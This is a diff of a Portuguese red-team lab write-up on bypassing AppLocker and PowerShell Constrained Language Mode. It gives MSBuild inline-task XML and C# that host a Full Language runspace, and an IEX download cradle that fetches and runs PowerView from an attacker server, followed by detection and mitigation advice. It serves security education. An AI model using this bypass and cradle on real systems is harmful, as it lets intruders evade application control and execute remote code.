@@ -4,7 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Bypass de AppLocker e Constrained Language Mode | lucas.albino</title>
-<meta name="description" content="Pesquisa de laboratório: contornando AppLocker e o Constrained Language Mode do PowerShell para recuperar Full Language e carregar ferramentas em memória.">
+<meta name="description" content="Laboratório completo: contornando AppLocker e o Constrained Language Mode do PowerShell com um wrapper via MSBuild para recuperar Full Language e carregar o PowerView em memória.">
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='18' fill='%230a0e13'/><text y='68' x='50' text-anchor='middle' font-size='58' font-family='monospace' fill='%23ff2b3d'>&gt;_</text></svg>">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -36,65 +36,47 @@
       <div class="post-meta">
         <span>ago 2026</span>
         <span class="chip red">Red Team</span>
-        <span class="chip ad">Windows</span>
-        <span>pesquisa · lab</span>
+        <span class="chip ad">Windows · AD</span>
+        <span>lab · PoC</span>
       </div>
       <h1>Bypass de AppLocker e Constrained Language Mode</h1>
       <p style="color:var(--txt-dim);margin:0">
-        Uma estação de trabalho endurecida com AppLocker e PowerShell em Constrained Language Mode.
-        O objetivo: recuperar o Full Language e carregar ferramentas de pós-exploração em memória,
-        sem tocar o disco em diretório proibido.
+        Uma estação do domínio <code>ecorp</code> com AppLocker e Constrained Language Mode ativos.
+        O plano: recuperar um PowerShell em <strong>Full Language</strong> e rodar o PowerView em
+        memória para enumerar o Active Directory, sem tocar o disco onde o antivírus e o AppLocker
+        estão de guarda.
       </p>
     </div>
 
     <div class="disclosure">
       <strong>// escopo</strong><br>
-      Pesquisa conduzida em laboratório próprio e isolado, sem qualquer relação com sistemas de
-      produção ou ativos de terceiros. Fins estritamente educacionais. Aplicar estas técnicas em
-      ambientes sem autorização prévia é ilegal.
+      Laboratório próprio e isolado, reproduzindo o cenário do livro <em>How to Hack Like a Legend:
+      Breaking Windows</em> (Sparc Flow). Domínio e dados são fictícios. Fins estritamente
+      educacionais; aplicar estas técnicas sem autorização é ilegal.
     </div>
 
     <h2>Objetivo</h2>
     <p>
-      O alvo é uma workstation Windows com duas camadas de contenção ativas: <strong>AppLocker</strong>,
-      restringindo de onde binários e scripts podem ser executados, e o <strong>Constrained Language
-      Mode (CLM)</strong> do PowerShell, que limita drasticamente o que a linguagem consegue fazer.
-      A meta da pesquisa é carregar o <code>PowerView</code> para enumerar o Active Directory
-      <strong>diretamente em memória</strong> — evitando escrever o script em disco, onde tanto o
-      antivírus quanto o AppLocker o pegariam.
+      O alvo tem duas camadas de contenção: o <strong>AppLocker</strong>, que restringe de onde
+      binários e scripts podem ser executados, e o <strong>Constrained Language Mode (CLM)</strong>
+      do PowerShell, que limita drasticamente o que a linguagem consegue fazer. Quero carregar o
+      <code>PowerView</code> para enumerar o AD, mas ele precisa rodar em memória. Em disco, tanto o
+      Windows Defender quanto o AppLocker o bloqueariam.
     </p>
 
-    <h2>1. Reconhecimento do host</h2>
+    <h2>1. O obstáculo: Constrained Language Mode</h2>
     <p>
-      O primeiro passo é identificar a versão exata do Windows. Isso orienta o mapeamento de
-      vulnerabilidades e de técnicas aplicáveis àquela build.
-    </p>
-    <pre><code>systeminfo</code></pre>
-    <figure class="shot">
-      <a href="../assets/img/applocker/01-systeminfo.png" target="_blank" rel="noopener">
-        <img src="../assets/img/applocker/01-systeminfo.png" alt="Saída do comando systeminfo mostrando Windows 11 Pro build 26200"></a>
-      <figcaption>systeminfo — Windows 11 Pro, build 26200</figcaption>
-    </figure>
-
-    <h2>2. O obstáculo: Constrained Language Mode</h2>
-    <p>
-      O plano inicial era instanciar um cliente HTTP para baixar e executar o PowerView em memória,
-      um padrão clássico de <em>download cradle</em>:
+      A primeira tentativa é o padrão clássico de <em>download cradle</em>: instanciar um cliente
+      HTTP para baixar e executar o script direto na memória. Ela falha de imediato, porque o
+      PowerShell recusa criar o objeto e o modo de linguagem só aceita os tipos básicos:
     </p>
     <pre><code>$browser = New-Object System.Net.WebClient</code></pre>
-    <p>
-      A tentativa falha. O PowerShell recusa a criação do objeto porque o modo de linguagem só
-      permite os tipos básicos (<em>core types</em>):
-    </p>
     <figure class="shot">
       <a href="../assets/img/applocker/02-newobject-clm.png" target="_blank" rel="noopener">
         <img src="../assets/img/applocker/02-newobject-clm.png" alt="Erro CannotCreateTypeConstrainedLanguage ao executar New-Object System.Net.WebClient"></a>
-      <figcaption>New-Object bloqueado — PSNotSupportedException / CannotCreateTypeConstrainedLanguage</figcaption>
+      <figcaption>New-Object bloqueado: PSNotSupportedException / CannotCreateTypeConstrainedLanguage</figcaption>
     </figure>
-    <p>
-      Confirmando a hipótese, uma consulta ao modo de linguagem da sessão devolve
-      <code>ConstrainedLanguage</code>:
-    </p>
+    <p>Confirmando o motivo, o modo de linguagem da sessão é <code>ConstrainedLanguage</code>:</p>
     <pre><code>$ExecutionContext.SessionState.LanguageMode
 # ConstrainedLanguage</code></pre>
     <figure class="shot">
@@ -104,17 +86,17 @@
     </figure>
     <blockquote>
       <p>
-        Em CLM, o PowerShell bloqueia <code>New-Object</code> para tipos arbitrários do .NET,
-        chamadas diretas a métodos .NET, tipos <code>Add-Type</code>, COM e mais. É a contenção que a
-        Microsoft acopla ao AppLocker/WDAC: mesmo com a shell aberta, o atacante fica sem as
-        primitivas que a maioria das ferramentas ofensivas assume.
+        Em CLM, o PowerShell bloqueia <code>New-Object</code> para tipos arbitrários do .NET, chamadas
+        diretas a métodos, <code>Add-Type</code>, COM e mais. É a contenção que a Microsoft acopla ao
+        AppLocker/WDAC: mesmo com a shell aberta, o atacante fica sem as primitivas que a maioria das
+        ferramentas ofensivas assume.
       </p>
     </blockquote>
 
-    <h2>3. Entendendo as regras do AppLocker</h2>
+    <h2>2. As regras do AppLocker</h2>
     <p>
-      Antes de tentar o bypass, é preciso saber de onde a política <em>permite</em> execução. As
-      regras efetivas se leem direto pelo módulo do AppLocker:
+      Antes do bypass, é preciso saber de onde a política <em>permite</em> execução. As regras
+      efetivas se leem direto pelo módulo:
     </p>
     <pre><code>Import-Module AppLocker
 $a = Get-AppLockerPolicy -Effective
@@ -122,142 +104,213 @@ $a.RuleCollections</code></pre>
     <figure class="shot">
       <a href="../assets/img/applocker/04-applocker-rules.png" target="_blank" rel="noopener">
         <img src="../assets/img/applocker/04-applocker-rules.png" alt="Regras padrão do AppLocker permitindo Program Files e a pasta Windows"></a>
-      <figcaption>Regras padrão — execução permitida em %PROGRAMFILES% e %WINDIR%</figcaption>
+      <figcaption>Regras padrão: execução permitida em %PROGRAMFILES% e %WINDIR%</figcaption>
     </figure>
     <p>
-      O host roda as <strong>regras padrão</strong>: permite ao grupo <em>Everyone</em> executar o
-      que estiver em <code>%PROGRAMFILES%</code> e em <code>%WINDIR%</code>. À primeira vista parece
-      seguro — um usuário comum não escreve nesses diretórios. Na prática, essas duas árvores contêm
-      subpastas graváveis por usuário e, principalmente, <strong>binários assinados pela Microsoft
-      que executam código por nós</strong> (os chamados LOLBINs). É por aí que o bypass entra.
+      O host roda as <strong>regras padrão</strong>: o grupo <em>Everyone</em> pode executar o que
+      estiver em <code>%PROGRAMFILES%</code> e em <code>%WINDIR%</code>. Parece seguro, já que um
+      usuário comum não escreve nesses diretórios. O detalhe é que <code>%WINDIR%</code> guarda
+      binários assinados pela Microsoft que executam código por nós (os <strong>LOLBINs</strong>). Um
+      deles vai ser a porta de entrada.
     </p>
 
-    <h2>4. A ideia do bypass: um wrapper próprio de PowerShell</h2>
+    <h2>3. A ideia: um wrapper próprio de PowerShell</h2>
     <p>
-      O ponto-chave é que o Constrained Language Mode é uma propriedade do <em>host</em> de
-      PowerShell — não do motor em si. Boa parte das funcionalidades vem da biblioteca
+      O ponto-chave: o Constrained Language Mode é uma propriedade do <em>host</em> de PowerShell, não
+      do motor. Boa parte das funcionalidades vem da biblioteca
       <code>System.Management.Automation.dll</code>, e essa DLL continua operando em
-      <strong>Full Language</strong> mesmo quando a sessão interativa está em CLM.
+      <strong>Full Language</strong> mesmo com a sessão interativa em CLM.
     </p>
     <p>
-      A consequência é direta: se conseguirmos construir <strong>nosso próprio host</strong> — um
-      wrapper que carrega <code>System.Management.Automation.dll</code> e cria um <em>runspace</em>
-      novo — esse runspace tende a nascer em Full Language, devolvendo o PowerShell completo. E se
-      esse wrapper for disparado por um binário que o AppLocker já confia (por exemplo, o
-      <code>MSBuild.exe</code>, que está sob <code>%WINDIR%</code> e executa tarefas inline), as duas
-      barreiras caem ao mesmo tempo: o AppLocker aprova o executável, e o runspace recém-criado
-      escapa do CLM.
+      A consequência é direta: se construirmos <strong>nosso próprio host</strong>, um wrapper que
+      carrega <code>System.Management.Automation.dll</code> e cria um <em>runspace</em> novo, esse
+      runspace nasce em Full Language e devolve o PowerShell completo. E se ele for disparado por um
+      binário que o AppLocker já confia, as duas barreiras caem juntas.
     </p>
-    <blockquote>
-      <p>
-        É a mesma família de técnicas catalogada no <em>Ultimate AppLocker Bypass List</em> e no
-        <code>psh.xml</code> do <em>How to Hack Like a Legend</em> (referências abaixo): usar um LOLBIN
-        confiável como porta de entrada para hospedar um runspace em Full Language.
-      </p>
-    </blockquote>
 
-    <h2>5. Execução: MSBuild recuperando o Full Language</h2>
+    <h2>4. Montando o wrapper com MSBuild</h2>
     <p>
-      A prova de conceito é o <code>psh.xml</code> do <em>How to Hack Like a Legend</em>: um arquivo
-      de projeto do MSBuild com uma <em>inline task</em> em C# que carrega
-      <code>System.Management.Automation.dll</code>, cria um <em>runspace</em> e executa comandos de
-      PowerShell. Para não esbarrar nas regras de script do AppLocker, o projeto é entregue com
-      extensão <code>.txt</code> — o MSBuild aceita qualquer extensão, e <code>MSBuild.exe</code> vive
-      sob <code>%WINDIR%</code>, portanto o AppLocker já o aprova.
+      O veículo é o <code>MSBuild.exe</code>: assinado pela Microsoft, mora sob <code>%WINDIR%</code>
+      (portanto permitido pelo AppLocker) e sabe compilar e executar <em>inline tasks</em> em C#. O
+      wrapper vive num arquivo de aparência inofensiva (aqui, um <code>.txt</code>). A workstation usa
+      o MSBuild <strong>4.0</strong>, então começamos fixando essa versão:
     </p>
-    <pre><code>cd C:\Windows\Microsoft.NET\Framework64\v4.0.30319
-.\MSBuild.exe 'C:\Users\blancha.andrea\Downloads\dunga.txt'</code></pre>
+    <pre><code>&lt;Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt;
+&lt;/Project&gt;</code></pre>
+    <p>Definimos uma <em>custom task</em> e a adicionamos ao <em>target</em> do projeto:</p>
+    <pre><code>&lt;Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt;
+  &lt;Target Name="PSBYPASS"&gt;
+    &lt;PsCommand/&gt;
+  &lt;/Target&gt;
+&lt;/Project&gt;</code></pre>
+    <p>
+      A task recebe o nome <code>PsCommand</code>, e o MSBuild vai compilá-la e executá-la. Para
+      compilar C# inline, carregamos a <code>CodeTaskFactory</code> de
+      <code>Microsoft.Build.Tasks.v4.0.dll</code> e referenciamos
+      <code>System.Management.Automation</code>:
+    </p>
+    <pre><code>&lt;Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt;
+  &lt;Target Name="PSBYPASS"&gt;
+    &lt;PsCommand/&gt;
+  &lt;/Target&gt;
+
+  &lt;UsingTask
+      TaskName="PsCommand"
+      TaskFactory="CodeTaskFactory"
+      AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"&gt;
+    &lt;Task&gt;
+      &lt;Reference Include="System.Management.Automation"/&gt;
+      &lt;Code Type="Class" Language="cs"&gt;
+        &lt;![CDATA[
+        // código C# aqui
+        ]]&gt;
+      &lt;/Code&gt;
+    &lt;/Task&gt;
+  &lt;/UsingTask&gt;
+&lt;/Project&gt;</code></pre>
+
+    <h3>O código C#</h3>
+    <p>
+      Dentro do <code>CDATA</code> vai a task. Ela cria um objeto <code>PowerShell</code> a partir de
+      <code>System.Management.Automation</code> e, como prova de conceito, pergunta o modo de
+      linguagem do runspace recém-criado:
+    </p>
+    <pre><code>using System;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+using System.Management.Automation;
+using System.Management.Automation.Host;
+using System.Management.Automation.Runspaces;
+using PowerShell = System.Management.Automation.PowerShell;
+
+public class PsCommand : Task, ITask
+{
+    public override bool Execute()
+    {
+        Console.WriteLine("Executing PS commands");
+
+        PowerShell Ps_instance = PowerShell.Create();
+        Ps_instance.AddScript("$ExecutionContext.SessionState.LanguageMode");
+
+        foreach (string str in Ps_instance.Invoke&lt;string&gt;())
+            Console.WriteLine(str);
+
+        Console.WriteLine("Press any key to exit...");
+        Console.ReadKey();
+        return true;
+    }
+}</code></pre>
+
+    <h2>5. Executando: Full Language de volta</h2>
+    <p>
+      Rodando o wrapper com o MSBuild permitido pelo AppLocker. O arquivo é um <code>.txt</code>
+      qualquer, porque o AppLocker avalia o binário que dispara, não o conteúdo do texto:
+    </p>
+    <pre><code>.\MSBuild.exe C:\Users\...\Downloads\dunga.txt</code></pre>
     <figure class="shot">
       <a href="../assets/img/applocker/05-msbuild-fulllang.png" target="_blank" rel="noopener">
-        <img src="../assets/img/applocker/05-msbuild-fulllang.png" alt="MSBuild executando uma inline task que imprime FullLanguage"></a>
-      <figcaption>MSBuild executa a inline task e o runspace responde <code>FullLanguage</code></figcaption>
+        <img src="../assets/img/applocker/05-msbuild-fulllang.png" alt="MSBuild executando a task e imprimindo FullLanguage"></a>
+      <figcaption>MSBuild compila e roda a task inline, e o runspace responde <strong>FullLanguage</strong></figcaption>
     </figure>
     <p>
-      A compilação inicia, a task roda os comandos de PowerShell e imprime <code>FullLanguage</code>.
-      A hipótese se confirma: o runspace criado pelo nosso próprio host nasce sem as restrições do
-      CLM, ainda que a sessão interativa que o disparou continue confinada.
+      O runspace criado pela DLL nasceu em <strong>Full Language</strong>. As duas barreiras caíram no
+      mesmo movimento: o AppLocker aprovou o <code>MSBuild.exe</code> e o CLM não alcança o novo host.
     </p>
+
+    <h2>6. Console interativo</h2>
     <p>
-      Um segundo projeto — <code>console.txt</code> — vai além de executar comandos soltos: ele
-      hospeda um <strong>console interativo</strong> em Full Language, o <em>PowerShell Console Host
-      Sample Application</em>. É um shell completo dentro do processo confiável do MSBuild.
+      Uma PoC que só imprime o modo de linguagem é pouco. Aproveitando o excelente trabalho do Sparc
+      Flow em <em>How to Hack Like a Legend</em>, o mesmo princípio vira um <strong>console
+      interativo</strong> completo. A lógica é idêntica: XML disfarçado de <code>.txt</code>,
+      compilado pelo <code>MSBuild.exe</code> (aceito pelo AppLocker), entregando um PowerShell em Full
+      Language.
     </p>
-    <pre><code>.\MSBuild.exe 'C:\Users\blancha.andrea\Downloads\console.txt'</code></pre>
+    <pre><code>.\MSBuild.exe C:\Users\...\Downloads\console.txt</code></pre>
     <figure class="shot">
       <a href="../assets/img/applocker/06-console-wrapper.png" target="_blank" rel="noopener">
-        <img src="../assets/img/applocker/06-console-wrapper.png" alt="Console interativo do wrapper de PowerShell reportando FullLanguage"></a>
-      <figcaption>O wrapper interativo — <code>LanguageMode</code> agora devolve <code>FullLanguage</code></figcaption>
+        <img src="../assets/img/applocker/06-console-wrapper.png" alt="Console interativo do wrapper em FullLanguage"></a>
+      <figcaption>Windows PowerShell Wrapper: sessão interativa, <code>LanguageMode = FullLanguage</code></figcaption>
     </figure>
-    <p>
-      Dentro do wrapper, a mesma consulta que antes acusava CLM agora responde
-      <code>FullLanguage</code>. As primitivas do .NET voltaram a estar disponíveis.
+    <p style="color:var(--txt-faint);font-size:.9rem">
+      Fonte do console interativo:
+      <a href="https://github.com/sparcflow/HackLikeALegend/blob/master/msbuild/console.xml" target="_blank" rel="noopener">sparcflow/HackLikeALegend, msbuild/console.xml</a>.
     </p>
 
-    <h2>6. Carregando o PowerView em memória</h2>
+    <h2>7. Carregando o PowerView em memória</h2>
     <p>
-      Com o Full Language recuperado, o <code>New-Object</code> que falhara no início agora é aceito
-      sem erro:
+      Com Full Language de volta, o <code>New-Object</code> funciona. O Windows Defender segue ativo,
+      então o PowerView é carregado <strong>direto na memória</strong>, evitando a detecção baseada em
+      arquivo:
     </p>
-    <pre><code>$browser = New-Object System.Net.WebClient;</code></pre>
     <figure class="shot">
       <a href="../assets/img/applocker/07-webclient-ok.png" target="_blank" rel="noopener">
-        <img src="../assets/img/applocker/07-webclient-ok.png" alt="New-Object System.Net.WebClient executando sem erro no wrapper"></a>
-      <figcaption>O mesmo <code>New-Object</code> do passo 2 — agora sem exceção</figcaption>
+        <img src="../assets/img/applocker/07-webclient-ok.png" alt="New-Object System.Net.WebClient agora executa sem erro"></a>
+      <figcaption>Agora <code>New-Object System.Net.WebClient</code> executa sem erro</figcaption>
     </figure>
-    <p>
-      A partir daí, o <em>download cradle</em> clássico completa o plano: configura as credenciais de
-      proxy, baixa o PowerView (aqui renomeado <code>miniview.ps1</code>) do servidor do atacante e o
-      carrega direto na memória com <code>IEX</code> — sem nunca tocar o disco.
-    </p>
-    <pre><code>$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
-IEX($browser.DownloadString('http://192.168.0.16:8000/miniview.ps1'));</code></pre>
+    <pre><code>$browser = New-Object System.Net.WebClient
+$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+IEX($browser.DownloadString('http://192.168.0.16:8000/miniview.ps1'))</code></pre>
     <figure class="shot">
       <a href="../assets/img/applocker/08-download-cradle.png" target="_blank" rel="noopener">
-        <img src="../assets/img/applocker/08-download-cradle.png" alt="Download cradle baixando e executando o PowerView em memória via IEX"></a>
-      <figcaption>Download cradle — PowerView carregado em memória via <code>IEX</code></figcaption>
+        <img src="../assets/img/applocker/08-download-cradle.png" alt="Download cradle carregando o PowerView em memória via IEX"></a>
+      <figcaption>Download cradle: PowerView carregado em memória via <code>IEX</code></figcaption>
     </figure>
 
-    <h2>7. Resultado: enumeração do Active Directory</h2>
-    <p>
-      Com o PowerView carregado, a enumeração do domínio flui normalmente. Um simples
-      <code>Get-NetUser</code> já lista as contas — e revela um achado clássico de má configuração:
-      <strong>uma senha deixada em texto claro no campo <em>description</em> de um usuário</strong>.
-    </p>
-    <pre><code>Get-NetUser | select name, description</code></pre>
+    <h2>8. Enumerando o Active Directory</h2>
+    <p>Com o PowerView carregado, uma enumeração simples de usuários do domínio:</p>
+    <pre><code>Get-NetUser | Select name, description</code></pre>
     <figure class="shot">
       <a href="../assets/img/applocker/09-getnetuser.png" target="_blank" rel="noopener">
-        <img src="../assets/img/applocker/09-getnetuser.png" alt="Get-NetUser listando contas do domínio, com uma senha no campo description"></a>
-      <figcaption>Get-NetUser — domínio enumerado; note a senha no campo <code>description</code></figcaption>
+        <img src="../assets/img/applocker/09-getnetuser.png" alt="Saída de Get-NetUser listando usuários e descrições, com uma senha exposta"></a>
+      <figcaption>Get-NetUser, e de bônus uma senha exposta na descrição do LDAP</figcaption>
     </figure>
     <p>
-      As duas camadas de contenção foram vencidas ao mesmo tempo: o AppLocker aprovou a execução
-      porque a porta de entrada foi um LOLBIN confiável sob <code>%WINDIR%</code>, e o CLM foi
-      contornado porque o runspace nasceu num host que criamos, e não no host interativo restrito.
+      Além dos usuários, o campo <code>description</code> entregou um brinde clássico de AD real: uma
+      <strong>senha guardada em texto claro na descrição do objeto</strong>, o tipo de
+      <em>low-hanging fruit</em> que enumeração de LDAP costuma revelar.
     </p>
 
-    <h2>8. Detecção e mitigação</h2>
-    <p>Do lado defensivo, este cenário é bastante observável e endurecível:</p>
+    <h2>Conclusão</h2>
+    <p>
+      Duas defesas sérias, AppLocker e Constrained Language Mode, foram contornadas não por uma falha
+      de software, mas pela combinação de dois fatos de <em>design</em>: o CLM vive no host, e um
+      LOLBIN confiável (<code>MSBuild.exe</code>) hospeda um runspace novo em Full Language. Fica a
+      lição: <strong>defesa em profundidade cai quando uma das camadas confia em uma árvore inteira de
+      binários</strong>. A partir daí, o caminho até enumerar o AD e achar credenciais é curto.
+    </p>
+
+    <h2>Detecção e mitigação</h2>
     <ul>
-      <li><strong>WDAC no lugar (ou além) do AppLocker:</strong> política baseada em código com
-      regras de DLL fecha boa parte dos LOLBINs que o AppLocker sozinho ignora.</li>
-      <li><strong>Script Block Logging (evento 4104) e AMSI:</strong> a criação de um runspace e a
-      importação de ferramentas ficam registradas mesmo quando a execução é em memória.</li>
-      <li><strong>Bloquear ou auditar LOLBINs</strong> como <code>MSBuild.exe</code>,
-      <code>InstallUtil.exe</code> e afins quando não houver necessidade legítima.</li>
-      <li><strong>Revisar as regras padrão do AppLocker:</strong> as <em>default rules</em> confiam em
-      árvores inteiras; o endurecimento real exige regras por publisher/hash e a remoção de
-      subpastas graváveis por usuário sob os caminhos permitidos.</li>
+      <li><strong>WDAC no lugar (ou além) do AppLocker:</strong> política baseada em código com regras
+      de DLL fecha boa parte dos LOLBINs que o AppLocker sozinho ignora.</li>
+      <li><strong>Bloquear ou auditar MSBuild.exe</strong> e afins (<code>InstallUtil</code>,
+      <code>csc</code>) em estações que não compilam código.</li>
+      <li><strong>Script Block Logging (evento 4104) e AMSI:</strong> a criação do runspace e o
+      carregamento do PowerView ficam registrados mesmo em memória.</li>
+      <li><strong>Revisar as default rules do AppLocker:</strong> trocar confiança em árvore inteira
+      por regras de publisher/hash e remover subpastas graváveis por usuário.</li>
+      <li><strong>Higiene de AD:</strong> nunca guardar senha em campo <code>description</code>;
+      auditar o atributo periodicamente.</li>
     </ul>
 
-    <h2>Referências</h2>
+    <h2>Referências e créditos</h2>
+    <p style="color:var(--txt-dim)">
+      Todo o cenário é um laboratório do livro <strong>How to Hack Like a Legend: Breaking
+      Windows</strong>, do <strong>Sparc Flow</strong>, a quem vão os créditos da técnica e do console
+      interativo.
+    </p>
     <ul>
-      <li><a href="https://www.hackingarticles.in/bypassing-wdac-and-applocker-using-ligolo/" target="_blank" rel="noopener">Bypassing WDAC and AppLocker using Ligolo — Hacking Articles</a></li>
-      <li><a href="https://www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/" target="_blank" rel="noopener">Windows AppLocker Policy: A Beginner's Guide — Hacking Articles</a></li>
+      <li><a href="https://github.com/sparcflow/HackLikeALegend/blob/master/msbuild/psh.xml" target="_blank" rel="noopener">sparcflow/HackLikeALegend, msbuild/psh.xml</a></li>
+      <li><a href="https://github.com/sparcflow/HackLikeALegend/blob/master/msbuild/console.xml" target="_blank" rel="noopener">sparcflow/HackLikeALegend, msbuild/console.xml</a></li>
       <li><a href="https://github.com/api0cradle/ultimateapplockerbypasslist" target="_blank" rel="noopener">api0cradle/UltimateAppLockerByPassList</a></li>
-      <li><a href="https://github.com/sparcflow/HackLikeALegend/blob/master/msbuild/psh.xml" target="_blank" rel="noopener">sparcflow/HackLikeALegend — msbuild/psh.xml</a></li>
-      <li><a href="https://sliver.sh/docs/?name=Stagers" target="_blank" rel="noopener">Sliver C2 — Stagers</a></li>
-      <li>How to Hack Like a Legend — Breaking Windows (Sparc Flow)</li>
+      <li><a href="https://www.hackingarticles.in/bypassing-wdac-and-applocker-using-ligolo/" target="_blank" rel="noopener">Bypassing WDAC and AppLocker using Ligolo, Hacking Articles</a></li>
+      <li><a href="https://www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/" target="_blank" rel="noopener">Windows AppLocker Policy: A Beginner's Guide, Hacking Articles</a></li>
+      <li><a href="https://sliver.sh/docs/?name=Stagers" target="_blank" rel="noopener">Sliver C2, Stagers</a></li>
     </ul>
+    <p style="color:var(--txt-faint);font-size:.88rem;margin-top:20px">
+      <em>PS: o arquivo do wrapper virou <code>dunga.txt</code>, homenagem ao cachorro da minha tia,
+      que fazia companhia na hora de escrever a PoC. 🐶</em>
+    </p>
 
     <p style="margin-top:40px">
       <a class="back" href="../writeups.html">&larr; voltar para writeups</a>
